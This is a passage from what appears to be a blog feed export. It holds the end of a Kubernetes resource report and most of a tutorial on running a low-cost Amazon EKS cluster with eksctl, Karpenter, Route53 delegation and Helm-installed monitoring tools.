ebs-csi-controller-fd8649d65-dzr77 6.0m 60.0m 600.0m __ __ ‚îÇ ‚îú‚îÄ ebs-csi-node-lnhz4 3.0m 30.0m 300.0m __ __ ‚îÇ ‚îú‚îÄ external-dns-7d5dfdc9bc-dwf2j 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ forecastle-fd9fbf494-mz78d 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ ingress-nginx-controller-5c58df8c6f-5qtsj 1.0m 100.0m __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-kube-state-metrics-75b97d7857-4q29f 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-operator-c4576c8c5-lv9tj 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-prometheus-node-exporter-grtqf 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ kube-proxy-snhd4 1.0m 100.0m __ __ __ ‚îÇ ‚îú‚îÄ mailhog-7fd4cdc758-c6pht 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ metrics-server-7bf7496f67-hg8dt 3.0m __ __ __ __ ‚îÇ ‚îú‚îÄ oauth2-proxy-c74b9b769-7fx6m 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ prometheus-kube-prometheus-stack-prometheus-0 95.0m 200.0m 200.0m __ __ ‚îÇ ‚îî‚îÄ wiz-kubernetes-connector-broker-5d8fcfdb94-nq2lw 1.0m __ __ __ __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal (3%) 50.0m (73%) 1.4 (98%) 1.9 1.9 30.0m ‚îÇ ‚îú‚îÄ aws-node-4d64v 2.0m 25.0m __ __ __ ‚îÇ ‚îú‚îÄ aws-node-termination-handler-v9jpw 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ cert-manager-7fb84796f4-mmp7g 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ cert-manager-cainjector-7f694c4c58-s5f4s 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ cert-manager-webhook-7cd8c769bb-5cr5d 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ coredns-79989457d9-9bz5s 1.0m 100.0m __ __ __ ‚îÇ ‚îú‚îÄ coredns-79989457d9-pv2gz 1.0m 100.0m __ __ __ ‚îÇ ‚îú‚îÄ ebs-csi-controller-fd8649d65-pllkv 6.0m 60.0m 600.0m __ __ ‚îÇ ‚îú‚îÄ ebs-csi-node-cffz8 3.0m 30.0m 300.0m __ __ ‚îÇ ‚îú‚îÄ karpenter-7b786469d4-s52fc 15.0m 1.0 1.0 __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-grafana-b45c4f79-h67r8 16.0m __ __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-prometheus-node-exporter-gtgv7 1.0m __ __ __ __ ‚îÇ ‚îî‚îÄ kube-proxy-zvnhr 1.0m 100.0m __ __ __ ‚îî‚îÄ ip-192-168-84-230.ec2.internal (1%) 11.0m (60%) 1.2 (16%) 300.0m 1.9 775.0m ‚îú‚îÄ aws-node-4c49x 3.0m 25.0m __ __ __ ‚îú‚îÄ aws-node-termination-handler-dsd64 1.0m __ __ __ __ ‚îú‚îÄ ebs-csi-node-s7b85 3.0m 30.0m 300.0m __ __ ‚îú‚îÄ kube-prometheus-stack-prometheus-node-exporter-pd8qx 1.0m __ __ __ __ ‚îú‚îÄ kube-proxy-2gblp 1.0m 100.0m __ __ __ ‚îî‚îÄ podinfo-59d6468db-jmwxh 2.0m 1.0 __ __ __ ephemeral-storage __ __ __ 53.8G __ ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 17.9G __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 17.9G __ ‚îî‚îÄ ip-192-168-84-230.ec2.internal __ __ __ 17.9G __ memory (21%) 1.6Gi (30%) 2.4Gi (86%) 6.7Gi 7.8Gi 1.1Gi ‚îú‚îÄ ip-192-168-14-250.ec2.internal (29%) 967.2Mi (23%) 750.0Mi (73%) 2.3Gi 3.2Gi 894.4Mi ‚îÇ ‚îú‚îÄ alertmanager-kube-prometheus-stack-alertmanager-0 20.8Mi 250.0Mi 50.0Mi __ __ ‚îÇ ‚îú‚îÄ aws-node-m8bqr 30.9Mi __ __ __ __ ‚îÇ ‚îú‚îÄ aws-node-termination-handler-4d4vt 12.9Mi __ __ __ __ ‚îÇ ‚îú‚îÄ ebs-csi-controller-fd8649d65-dzr77 54.8Mi 240.0Mi 1.5Gi __ __ ‚îÇ ‚îú‚îÄ ebs-csi-node-lnhz4 20.9Mi 120.0Mi 768.0Mi __ __ ‚îÇ ‚îú‚îÄ external-dns-7d5dfdc9bc-dwf2j 22.1Mi __ __ __ __ ‚îÇ ‚îú‚îÄ forecastle-fd9fbf494-mz78d 8.4Mi __ __ __ __ ‚îÇ ‚îú‚îÄ ingress-nginx-controller-5c58df8c6f-5qtsj 77.9Mi 90.0Mi __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-kube-state-metrics-75b97d7857-4q29f 15.3Mi __ __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-operator-c4576c8c5-lv9tj 33.6Mi __ __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-prometheus-node-exporter-grtqf 10.0Mi __ __ __ __ ‚îÇ ‚îú‚îÄ kube-proxy-snhd4 13.3Mi __ __ __ __ ‚îÇ ‚îú‚îÄ mailhog-7fd4cdc758-c6pht 4.0Mi __ __ __ __ ‚îÇ ‚îú‚îÄ metrics-server-7bf7496f67-hg8dt 17.8Mi __ __ __ __ ‚îÇ ‚îú‚îÄ oauth2-proxy-c74b9b769-7fx6m 8.4Mi __ __ __ __ ‚îÇ ‚îú‚îÄ prometheus-kube-prometheus-stack-prometheus-0 609.9Mi 50.0Mi 50.0Mi __ __ ‚îÇ ‚îî‚îÄ wiz-kubernetes-connector-broker-5d8fcfdb94-nq2lw 6.1Mi __ __ __ __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal (19%) 613.6Mi (46%) 1.5Gi (111%) 3.6Gi 3.2Gi 0.0 ‚îÇ ‚îú‚îÄ aws-node-4d64v 28.0Mi __ __ __ __ ‚îÇ ‚îú‚îÄ aws-node-termination-handler-v9jpw 12.0Mi __ __ __ __ ‚îÇ ‚îú‚îÄ cert-manager-7fb84796f4-mmp7g 30.7Mi __ __ __ __ ‚îÇ ‚îú‚îÄ cert-manager-cainjector-7f694c4c58-s5f4s 33.8Mi __ __ __ __ ‚îÇ ‚îú‚îÄ cert-manager-webhook-7cd8c769bb-5cr5d 11.5Mi __ __ __ __ ‚îÇ ‚îú‚îÄ coredns-79989457d9-9bz5s 15.6Mi 70.0Mi 170.0Mi __ __ ‚îÇ ‚îú‚îÄ coredns-79989457d9-pv2gz 15.0Mi 70.0Mi 170.0Mi __ __ ‚îÇ ‚îú‚îÄ ebs-csi-controller-fd8649d65-pllkv 56.1Mi 240.0Mi 1.5Gi __ __ ‚îÇ ‚îú‚îÄ ebs-csi-node-cffz8 19.3Mi 120.0Mi 768.0Mi __ __ ‚îÇ ‚îú‚îÄ karpenter-7b786469d4-s52fc 148.0Mi 1.0Gi 1.0Gi __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-grafana-b45c4f79-h67r8 221.9Mi __ __ __ __ ‚îÇ ‚îú‚îÄ kube-prometheus-stack-prometheus-node-exporter-gtgv7 9.3Mi __ __ __ __ ‚îÇ ‚îî‚îÄ kube-proxy-zvnhr 12.2Mi __ __ __ __ ‚îî‚îÄ ip-192-168-84-230.ec2.internal (6%) 86.5Mi (10%) 136.0Mi (56%) 768.0Mi 1.3Gi 607.3Mi ‚îú‚îÄ aws-node-4c49x 24.4Mi __ __ __ __ ‚îú‚îÄ aws-node-termination-handler-dsd64 12.1Mi __ __ __ __ ‚îú‚îÄ ebs-csi-node-s7b85 16.5Mi 120.0Mi 768.0Mi __ __ ‚îú‚îÄ kube-prometheus-stack-prometheus-node-exporter-pd8qx 7.3Mi __ __ __ __ ‚îú‚îÄ kube-proxy-2gblp 12.7Mi __ __ __ __ ‚îî‚îÄ podinfo-59d6468db-jmwxh 13.4Mi 16.0Mi __ __ __ pods __ (80%) 36.0 (80%) 36.0 45.0 9.0 ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ (100%) 17.0 (100%) 17.0 17.0 0.0 ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ (76%) 13.0 (76%) 13.0 17.0 4.0 ‚îî‚îÄ ip-192-168-84-230.ec2.internal __ (55%) 6.0 (55%) 6.0 11.0 5.0 Uninstall Podinfo: kubectl delete namespace podinfo || true Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{helm_values-podinfo,k8s-deployment-nginx}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "Run the cheapest Amazon EKS", "url": "/posts/cheapest-amazon-eks/", "categories": "Kubernetes, Amazon EKS", "tags": "Amazon EKS, k8s, kubernetes, karpenter, eksctl, cert-manager, external-dns, podinfo", "date": "2022-11-27 00:00:00 +0100", "content": "Sometimes, it‚Äôs necessary to save costs and run Amazon EKS in the most cost-effective way. The following notes describe how to run Amazon EKS at the lowest possible price. Requirements: Utilize two Availability Zones (AZs), or use a single zone if feasible to reduce costs associated with cross-AZ traffic Use Spot instances Choose a less expensive AWS region, such as us-east-1 Employ the most price-efficient EC2 instance type, t4g.medium (2 CPUs, 4GB RAM), which uses AWS Graviton processors based on ARM architecture Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use a Network Load Balancer (NLB) as it is a cost-efficient and optimized load balancing solution Configure worker nodes to run the maximum number of pods possible using the max-pods-per-node setting https://stackoverflow.com/questions/57970896/pod-limit-on-node-aws-eks https://aws.amazon.com/blogs/containers/amazon-vpc-cni-increases-pods-per-node-limits/ Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you would like to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Verify that all necessary variables have been set: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the necessary tools: You can skip these steps if you have all the required software already installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation steps should only be done once. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Use your domain registrar to change the nameservers for your zone (e.g., mylabs.dev) to use the Amazon Route 53 nameservers. You can find the required Route 53 nameservers as follows: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Create the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This step depends on your domain registrar; I use Cloudflare and automate this with Ansible: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create Route53 Create a CloudFormation template that defines the Route53 zone. Add the new domain CLUSTER_FQDN to Route 53 and configure DNS delegation from the BASE_DOMAIN. Create the Route53 zone: tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live. Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN. (domain for all applications) Ex: k01.k8s.mylabs.dev\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation create-stack \\ --parameters \"ParameterKey=BaseDomain,ParameterValue=${BASE_DOMAIN} ParameterKey=ClusterFQDN,ParameterValue=${CLUSTER_FQDN}\" \\ --stack-name \"${CLUSTER_NAME}-route53\" \\ --template-body \"file://${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53.yml\" \\ --tags \"$(echo \"${TAGS}\" | sed -e 's/\\([^=]*\\)=\\([^,]*\\),*/Key=\\1,Value=\\2 /g')\" || true fi After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. Create the Amazon EKS cluster using eksctl: tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b iam: withOIDC: true serviceAccounts: - metadata: name: cert-manager namespace: cert-manager wellKnownPolicies: certManager: true roleName: eksctl-${CLUSTER_NAME}-irsa-cert-manager - metadata: name: external-dns namespace: external-dns wellKnownPolicies: externalDNS: true roleName: eksctl-${CLUSTER_NAME}-irsa-external-dns # Allow users which are consuming the AWS_ROLE_TO_ASSUME to access the EKS iamIdentityMappings: - arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/admin groups: - system:masters username: admin karpenter: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ version: v0.31.4 createServiceAccount: true withSpotInterruptionQueue: true addons: - name: vpc-cni # min version 1.14.0 version: latest configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" - name: kube-proxy - name: coredns - name: aws-ebs-csi-driver managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 disablePodIMDS: true volumeEncrypted: true # For instances with less than 30 vCPUs the maximum number is 110 and for all other instances the maximum number is 250 # https://docs.aws.amazon.com/eks/latest/userguide/cni-increase-ip-addresses.html maxPodsPerNode: 110 EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-provisioner.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: # Enables consolidation which attempts to reduce cluster cost by both removing # un-needed nodes and down-sizing those that can't be removed. # https://youtu.be/OB7IZolZk78?t=2629 consolidation: enabled: true requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] kubeletConfiguration: maxPods: 110 # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: resources: cpu: 8 memory: 32Gi providerRef: name: default # Labels are arbitrary key-values that are applied to all nodes labels: managedBy: karpenter provisioner: default --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: amiFamily: Bottlerocket subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true tags: KarpenerProvisionerName: \"default\" Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF aws-node-termination-handler The AWS Node Termination Handler gracefully handles EC2 instance shutdowns within Kubernetes. Install the aws-node-termination-handler Helm chart and modify its default values as shown below: # renovate: datasource=helm depName=aws-node-termination-handler registryUrl=https://aws.github.io/eks-charts AWS_NODE_TERMINATION_HANDLER_HELM_CHART_VERSION=\"0.21.0\" helm repo add --force-update eks https://aws.github.io/eks-charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-node-termination-handler.yml\" &lt;&lt; EOF awsRegion: ${AWS_DEFAULT_REGION} EOF helm upgrade --install --version \"${AWS_NODE_TERMINATION_HANDLER_HELM_CHART_VERSION}\" --namespace kube-system --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-node-termination-handler.yml\" aws-node-termination-handler eks/aws-node-termination-handler mailhog MailHog will be used to receive email alerts from Prometheus. Install the mailhog Helm chart and modify its default values: # renovate: datasource=helm depName=mailhog registryUrl=https://codecentric.github.io/helm-charts MAILHOG_HELM_CHART_VERSION=\"5.2.3\" helm repo add --force-update codecentric https://codecentric.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" &lt;&lt; EOF image: repository: docker.io/cd2team/mailhog tag: \"1663459324\" ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/sj26/mailcatcher/main/assets/images/logo_large.png forecastle.stakater.com/appName: Mailhog nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hosts: - host: mailhog.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - mailhog.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILHOG_HELM_CHART_VERSION}\" --namespace mailhog --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" mailhog codecentric/mailhog kube-prometheus-stack The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It‚Äôs combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false alertmanager: config: global: smtp_smarthost: \"mailhog.mailhog.svc.cluster.local:1025\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email-notifications routes: - receiver: email-notifications matchers: [ '{severity=~\"warning|critical\"}' ] receivers: - name: email-notifications email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 33 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 11875-kubernetes-ingress-nginx-eks: # renovate: depName=\"Kubernetes Ingress Nginx - EKS\" gnetId: 11875 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 13473-portefaix-kubernetes-cluster-overview: # renovate: depName=\"Portefaix / Kubernetes cluster Overview\" gnetId: 13473 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 26 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 17 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailhog.mailhog.svc.cluster.local:1025\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: networkPolicy: enabled: true prometheus-node-exporter: networkPolicy: enabled: true 